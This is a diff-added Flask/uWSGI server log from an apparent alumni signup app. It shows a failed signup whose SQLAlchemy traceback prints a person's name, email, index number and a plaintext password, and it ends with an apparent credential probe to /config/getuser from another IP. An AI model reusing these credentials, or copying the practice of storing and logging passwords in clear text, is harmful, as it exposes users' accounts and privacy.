+[pid: 17328|app: 0|req: 98/262] 45.222.128.252 () {46 vars in 922 bytes} [Tue Oct 11 14:55:34 2022] GET /usersignup => generated 3404 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 99/263] 45.222.128.252 () {46 vars in 891 bytes} [Tue Oct 11 14:55:34 2022] GET /static/css/newstyle.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 175 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 63/264] 45.222.128.252 () {46 vars in 931 bytes} [Tue Oct 11 14:55:34 2022] GET /static/img/user.jpeg => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 172 bytes (0 switches on core 0)
+int/19/01/3496
+ofosuheneyaw3@gmail.com
+Kyere Ofosuhene Yaw
+Success
+[2022-10-11 14:55:50,320] ERROR in app: Exception on /usersignup [POST]
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlite3.OperationalError: no such table: alumni
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "./app.py", line 500, in usersignup
+    db.session.commit()
+  File "<string>", line 2, in commit
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 1451, in commit
+    self._transaction.commit(_to_root=self.future)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 829, in commit
+    self._prepare_impl()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 808, in _prepare_impl
+    self.session.flush()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3386, in flush
+    self._flush(objects)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3526, in _flush
+    transaction.rollback(_capture_exception=True)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 72, in __exit__
+    with_traceback=exc_tb,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/compat.py", line 208, in raise_
+    raise exception
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3486, in _flush
+    flush_context.execute()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/unitofwork.py", line 456, in execute
+    rec.execute(self)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/unitofwork.py", line 633, in execute
+    uow,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/persistence.py", line 250, in save_obj
+    insert,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/persistence.py", line 1241, in _emit_insert_statements
+    execution_options=execution_options,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1705, in _execute_20
+    return meth(self, args_10style, kwargs_10style, execution_options)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/sql/elements.py", line 334, in _execute_on_connection
+    self, multiparams, params, execution_options
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1582, in _execute_clauseelement
+    cache_hit=cache_hit,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1944, in _execute_context
+    e, statement, parameters, cursor, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 2125, in _handle_dbapi_exception
+    sqlalchemy_exception, with_traceback=exc_info[2], from_=e
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/compat.py", line 208, in raise_
+    raise exception
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: alumni
+[SQL: INSERT INTO alumni (name, password, email, indexnumber) VALUES (?, ?, ?, ?)]
+[parameters: ('Kyere Ofosuhene Yaw', 'central@123', 'ofosuheneyaw3@gmail.com', 'int/19/01/3496')]
+(Background on this error at: https://sqlalche.me/e/14/e3q8)
+[pid: 17327|app: 0|req: 64/265] 45.222.128.252 () {54 vars in 1107 bytes} [Tue Oct 11 14:55:50 2022] POST /usersignup => generated 290 bytes in 60 msecs (HTTP/1.1 500) 4 headers in 173 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 65/266] 45.61.185.198 () {40 vars in 673 bytes} [Tue Oct 11 14:58:56 2022] GET /config/getuser?index=0 => generated 232 bytes in 8 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
